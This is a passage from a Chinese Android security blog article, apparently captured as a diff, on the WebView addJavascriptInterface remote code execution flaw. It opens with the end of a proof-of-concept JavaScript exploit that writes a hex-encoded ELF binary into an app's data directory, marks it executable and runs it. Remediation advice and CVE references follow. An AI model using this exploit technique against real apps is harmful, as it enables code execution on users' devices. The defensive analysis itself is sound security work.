class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">bin</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\xE4\\x83\\x00\\x00\\x34\\x00\\x00\\x00\\x58\\x21\\x00\\x00\\x00\\x00\\x00\\x05\\x34\\x00\\x20\\x00\\x08\\x00\\x28\\x00\\x18\\x00\\x17\\x00\\x06\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x34\\x80\\x00\\x00\\x34\\x80\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x04\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x34\\x01\\x00\\x00\\x34\\x81\\x00\\x00\\x34\\x81\\x00\\x00\\x13--------------------------------------------------------------------------------------------------------------------------------\\x00\\x00\\x00\\x00\\xD4\\x00\\x00\\x00\\x03\\x00\\x00\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x44\\x20\\x00\\x00\\x2D\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x71\\x20\\x00\\x00\\xE4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"/system/bin/sh"</span><span class="crayon-sy">,</span><span class="crayon-s">"-c"</span><span class="crayon-sy">,</span><span class="crayon-s">"echo '"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">bin</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"' &gt; /data/data/com.example.hellojs/testBin"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"chmod"</span><span class="crayon-sy">,</span><span class="crayon-s">"755"</span><span class="crayon-sy">,</span><span class="crayon-s">"/data/data/com.example.hellojs/testBin"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">res</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-s">"/data/data/com.example.hellojs/testBin"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-e">getContents</span><span class="crayon-sy">(</span><span class="crayon-v">res</span><span class="crayon-sy">.</span><span class="crayon-e">getInputStream</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf511588322067-14"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">body</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-55a7aacabf511588322067-15"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-o">&gt;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0472 seconds] -->
+<p>“testBin”文件已拼接生成，如下图所示：<br>
+<img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB141IFHXXXXXcuXpXXG.B9OXXX-345-99.jpg" alt=""></p>
+<p>执行之后的结果如下：</p>
+<p><img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/TB1dncMHXXXXXaHXXXX.F05OVXX-720-617.jpg" alt="" width="360"></p>
+<h2>5. WebView远程代码执行漏洞修复建议</h2>
+<h3>1. API Level等于或高于17的Android系统【4】</h3>
+<p>出于安全考虑，为了防止Java层的函数被随便调用，Google在4.2版本之后，规定允许被调用的函数必须以@JavascriptInterface进行注解，所以如果某应用依赖的API Level为17或者以上，就不会受该问题的影响（注：Android 4.2中API Level小于17的应用也会受影响）。按照Google官方文档[5]使用示例：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf51b339806481" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">class JsObject {
+   @JavascriptInterface
+   public String toString() { return "injectedObject"; }
+}
+webView.addJavascriptInterface(new JsObject(), "injectedObject");
+webView.loadData("", "text/html", null);
+webView.loadUrl("javascript:alert(injectedObject.toString())");</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf51b339806481-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf51b339806481-2">2</div><div class="crayon-num" data-line="crayon-55a7aacabf51b339806481-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf51b339806481-4">4</div><div class="crayon-num" data-line="crayon-55a7aacabf51b339806481-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf51b339806481-6">6</div><div class="crayon-num" data-line="crayon-55a7aacabf51b339806481-7">7</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf51b339806481-1"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">JsObject</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf51b339806481-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-n">@JavascriptInterface</span></div><div class="crayon-line" id="crayon-55a7aacabf51b339806481-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-e">toString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"injectedObject"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf51b339806481-4"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-55a7aacabf51b339806481-5"><span class="crayon-v">webView</span><span class="crayon-sy">.</span><span class="crayon-e">addJavascriptInterface</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">JsObject</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"injectedObject"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf51b339806481-6"><span class="crayon-v">webView</span><span class="crayon-sy">.</span><span class="crayon-e">loadData</span><span class="crayon-sy">(</span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"text/html"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-55a7aacabf51b339806481-7"><span class="crayon-v">webView</span><span class="crayon-sy">.</span><span class="crayon-e">loadUrl</span><span class="crayon-sy">(</span><span class="crayon-s">"javascript:alert(injectedObject.toString())"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0025 seconds] -->
+<p></p>
+<h3>2. API Level等于或高于17的Android系统</h3>
+<p>建议不要使用addJavascriptInterface接口，以免带来不必要的安全隐患，请参照博文《在Webview中如何让JS与Java安全地互相调用》[6]。<br>
+如果一定要使用addJavascriptInterface接口:<br>
+1) 如果使用HTTPS协议加载URL，应进行证书校验防止访问的页面被篡改挂马；<br>
+2) 如果使用HTTP协议加载URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；<br>
+3) 如果加载本地Html，应将html文件内置在APK中，以及进行对html页面完整性的校验；</p>
+<h3>3. 移除Android系统内部的默认内置接口</h3>
+<p>同时，在2014年发现在Android系统中webkit中默认内置的一个searchBoxJavaBridge_ 接口同时存在远程代码执行漏洞，该漏洞公布于CVE-2014-1939[7], 建议开发者通过以下方式移除该Javascript接口:</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf523523179856" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;"> removeJavascriptInterface("searchBoxJavaBridge_")</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf523523179856-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf523523179856-1"><span class="crayon-h"> </span><span class="crayon-e">removeJavascriptInterface</span><span class="crayon-sy">(</span><span class="crayon-s">"searchBoxJavaBridge_"</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0007 seconds] -->
+<p>2014年香港理工大学的研究人员Daoyuan Wu和Rocky Chang发现了两个新的攻击向量存在于android/webkit/AccessibilityInjector.java中，分别是”accessibility” 和”accessibilityTraversal” ，调用了此组件的应用在开启辅助功能选项中第三方服务的安卓系统中会造成远程代码执行漏洞。该漏洞公布于CVE-2014-7224, 此漏洞原理与searchBoxJavaBridge_接口远程代码执行相似，均为未移除不安全的默认接口，建议开发者通过以下方式移除该JavaScript接口：</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7aacabf52a100755960" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">removeJavascriptInterface("accessibility")；
+ removeJavascriptInterface("accessibilityTraversal")；</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aacabf52a100755960-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aacabf52a100755960-2">2</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aacabf52a100755960-1"><span class="crayon-e">removeJavascriptInterface</span><span class="crayon-sy">(</span><span class="crayon-s">"accessibility"</span><span class="crayon-sy">)</span>；</div><div class="crayon-line crayon-striped-line" id="crayon-55a7aacabf52a100755960-2"><span class="crayon-h"> </span><span class="crayon-e">removeJavascriptInterface</span><span class="crayon-sy">(</span><span class="crayon-s">"accessibilityTraversal"</span><span class="crayon-sy">)</span>；</div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0406 seconds] -->
+<p>参考文章</p>
+<p>[1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6636<br>
+[2] Attacks on WebView in the Android System<br>
+[3] http://50.56.33.56/blog/?p=314<br>
+[4] Google Official Android API Level Reference<br>
+[5] http://developer.android.com/reference/android/webkit/WebView.html<br>
+#addJavascriptInterface(java.lang.Object, java.lang.String)<br>
+[6] 在Webview中如何让JS与Java安全地互相调用<br>
+[7] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1939</p>
+<p>转载自：http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.oMsDAl&amp;id=48</p>
+<p>&nbsp;</p>
+<p class="tags"><i class="fa fa-tag"></i> <a href="http://www.droidsec.cn/tag/android-system/" rel="tag">Android System</a> <a href="http://www.droidsec.cn/tag/apk/" rel="tag">APK</a></p>
+
+<div class="date">
+  <span class="day">14</span>
+  <span class="month">2015-03</span>
+</div>
+</article>
+<p>&nbsp;</p>
+	</div><div class="col-lg-3" id="side"><aside class="uazoh7-widget"><h3 style="margin-top: 0px;">文章分类</h3>		<div class="uazoh7-category-widget"><div class="uazoh7-widget-inner"><ul>
+<li><p><a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" title="APP漏洞挖掘"><i class="fa fa-folder-open"></i>APP漏洞挖掘</a> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/"><i class="fa fa-rss"></i></a> <span>25</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/androidsecuritybook/" title="安卓安全书籍"><i class="fa fa-folder-open"></i>安卓安全书籍</a> <a href="http://www.droidsec.cn/category/androidsecuritybook/"><i class="fa fa-rss"></i></a> <span>8</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/" title="安卓安全工具"><i class="fa fa-folder-open"></i>安卓安全工具</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/"><i class="fa fa-rss"></i></a> <span>11</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/" title="安卓漏洞攻防"><i class="fa fa-folder-open"></i>安卓漏洞攻防</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/"><i class="fa fa-rss"></i></a> <span>16</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/" title="安卓逆向分析"><i class="fa fa-folder-open"></i>安卓逆向分析</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/" title="移动安全资讯"><i class="fa fa-folder-open"></i>移动安全资讯</a> <a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li>		</ul></div></div>
+</aside><aside class="uazoh7-widget"><h3>友情链接</h3>
+	<ul class="xoxo blogroll">
+<li><a href="http://security.tencent.com/" target="_blank">腾讯TSRC</a></li>
+<li><a href="http://www.ijiandao.com/" target="_blank">爱尖刀</a></li>
+<li><a href="http://xteam.baidu.com/" target="_blank">Baidu x-team</a></li>
+<li><a href="http://blogs.360.cn/360mobile/" target="_blank">360移动安全</a></li>
+<li><a href="http://navisec.it/" target="_blank">navisec安全导航</a></li>
+<li><a href="http://www.nxadmin.com/">Nxadmin</a></li>
+<li><a href="http://www.secpulse.com/" target="_blank">安全脉博</a></li>
+<li><a href="http://www.monstersb.net/" target="_blank">Monster</a></li>
+<li><a href="http://jaq.alibaba.com/blog.htm" target="_blank">阿里聚安全</a></li>
+<li><a href="http://www.freebuf.com/" target="_blank">FreeBuf</a></li>
+<li><a href="http://www.wooyun.org/" target="_blank">乌云漏洞平台</a></li>
+<li><a href="http://wiki.secmobi.com/home" target="_blank">SecMobi Wiki</a></li>
+<li><a href="http://securityintelligence.com/" target="_blank">SecurityIntelligence</a></li>
+<li><a href="http://androidxref.com/" target="_blank">AndroidXRef</a></li>
+<li><a href="http://www.androiddevtools.cn/" target="_blank">AndroidDevTools</a></li>
+
+	</ul>
+</aside>
+</div></div></div></section>
+<div id="comments" style="display:none"><a name="respond"></a></div>
+<div id="denglu_tuijian"></div><div id="denglu_comment"><iframe name="easyXDM_default4934_provider" id="easyXDM_default4934_provider" frameborder="0" src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/commentMiddle.html" style="width: 100%; height: 232px;"></iframe></div>
+
+</div><!--uazoh7-content-->
+<footer class="uazoh7-footer">
+      <div class="container">
+        <div class="row">
+		<div class="col-lg-2 col-md-2">
+            <div class="uazoh7-widget uazoh7-links-widget">
+              <h3>links</h3>
+              <div class="uazoh7-widget-inner">
+                <ul id="footer_top_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
+</ul>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-4">
+            <div class="uazoh7-widget uazoh7-links-widget uazoh7-about-widget">
+              <h3>随机 <strong>文章</strong></h3>
+              <div class="uazoh7-widget-inner">
+   <ul>
+<li><a href="http://www.droidsec.cn/localbroadcastmanager-%e7%9a%84%e5%ae%9e%e7%8e%b0%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90/" rel="bookmark" title="LocalBroadcastManager 的实现原理分析">LocalBroadcastManager 的实现原理分析</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-activtity-security/" rel="bookmark" title="Android Activtity Security">Android Activtity Security</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%88%a9%e7%94%a8mono-for-android%e5%bc%80%e5%8f%91%e7%9a%84%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6/" rel="bookmark" title="利用Mono for Android开发的恶意软件">利用Mono for Android开发的恶意软件</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93app%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%8a%80%e6%9c%af/" rel="bookmark" title="安卓APP动态调试技术">安卓APP动态调试技术</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/adb-backupagent-%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-cve-2014-7953/" rel="bookmark" title="ADB backupAgent 提权漏洞分析 （CVE-2014-7953）">ADB backupAgent 提权漏洞分析 （CVE-2014-7953）</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e4%bd%bf%e7%94%a8drozer%e5%af%b9android%e5%ba%94%e7%94%a8%e8%bf%9b%e8%a1%8c%e5%ae%89%e5%85%a8%e8%af%84%e4%bc%b0/" rel="bookmark" title="使用drozer对Android应用进行安全评估">使用drozer对Android应用进行安全评估</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android%e5%ae%89%e5%85%a8%e6%94%bb%e9%98%b2%e6%8c%87%e5%8d%97-%e7%ac%ac2%e7%ab%a0-android%e7%9a%84%e5%ae%89%e5%85%a8%e8%ae%be%e8%ae%a1%e4%b8%8e%e6%9e%b6%e6%9e%84-%ef%bc%882%ef%bc%89/" rel="bookmark" title="《Android安全攻防指南》第2章 Android的安全设计与架构 （2）">《Android安全攻防指南》第2章 Android的安全设计与架构 （2）</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e4%b8%83%e7%a7%8d%e6%ad%a6%e5%99%a8%e4%b9%8b%e9%95%bf%e7%94%9f%e5%89%91-smali-instrumentation/" rel="bookmark" title="安卓动态调试七种武器之长生剑 – Smali Instrumentation">安卓动态调试七种武器之长生剑 – Smali Instrumentation</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e7%94%a8%e6%89%8b%e6%9c%ba%e8%bd%bb%e6%9d%be%e5%88%b7%e6%b4%9e%ef%bc%8c%e7%a7%bb%e5%8a%a8%e7%ab%af%e5%bc%80%e6%ba%90%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7%e5%90%88%e9%9b%86/" rel="bookmark" title="用手机轻松刷洞，移动端开源安全测试工具合集">用手机轻松刷洞，移动端开源安全测试工具合集</a></li>
+</ul>
+            </div>
+          </div></div>
+
+          <div class="col-lg-3 col-md-3">
+            <div class="uazoh7-widget uazoh7-tags-widget">
+              <h3>文章 <strong>Tags</strong></h3>
+              <div class="uazoh7-widget-inner">
+                <a href="http://www.droidsec.cn/tag/pin/" class="tag-link-47" title="1个话题" style="font-size: 13pt;">PIN</a>
+<a href="http://www.droidsec.cn/tag/tsrc/" class="tag-link-48" title="1个话题" style="font-size: 13pt;">TSRC</a>
+<a href="http://www.droidsec.cn/tag/ui/" class="tag-link-42" title="1个话题" style="font-size: 13pt;">UI</a>
+<a href="http://www.droidsec.cn/tag/activity/" class="tag-link-36" title="1个话题" style="font-size: 13pt;">Activity</a>
+<a href="http://www.droidsec.cn/tag/mobile-forensics/" class="tag-link-32" title="1个话题" style="font-size: 13pt;">Mobile Forensics</a>
+<a href="http://www.droidsec.cn/tag/santoku-linux/" class="tag-link-33" title="1个话题" style="font-size: 13pt;">Santoku Linux</a>
+<a href="http://www.droidsec.cn/tag/url/" class="tag-link-49" title="1个话题" style="font-size: 13pt;">URL</a>
+<a href="http://www.droidsec.cn/tag/sd/" class="tag-link-50" title="1个话题" style="font-size: 13pt;">SD</a>
+<a href="http://www.droidsec.cn/tag/debug/" class="tag-link-62" title="1个话题" style="font-size: 13pt;">DEBUG</a>
+<a href="http://www.droidsec.cn/tag/google-android/" class="tag-link-71" title="1个话题" style="font-size: 13pt;">Google Android</a>
+<a href="http://www.droidsec.cn/tag/verbose/" class="tag-link-61" title="1个话题" style="font-size: 13pt;">VERBOSE</a>
+<a href="http://www.droidsec.cn/tag/android-override/" class="tag-link-57" title="1个话题" style="font-size: 13pt;">Android Override</a>
+<a href="http://www.droidsec.cn/tag/http/" class="tag-link-51" title="1个话题" style="font-size: 13pt;">HTTP</a>
+<a href="http://www.droidsec.cn/tag/mitm/" class="tag-link-52" title="1个话题" style="font-size: 13pt;">MITM</a>
+<a href="http://www.droidsec.cn/tag/adb/" class="tag-link-24" title="1个话题" style="font-size: 13pt;">ADB</a>
+<a href="http://www.droidsec.cn/tag/root/" class="tag-link-22" title="1个话题" style="font-size: 13pt;">ROOT</a>
+<a href="http://www.droidsec.cn/tag/android-shared-preferences/" class="tag-link-18" title="1个话题" style="font-size: 13pt;">Android Shared Preferences</a>
+<a href="http://www.droidsec.cn/tag/android-internal-storage/" class="tag-link-19" title="1个话题" style="font-size: 13pt;">Android Internal Storage</a>
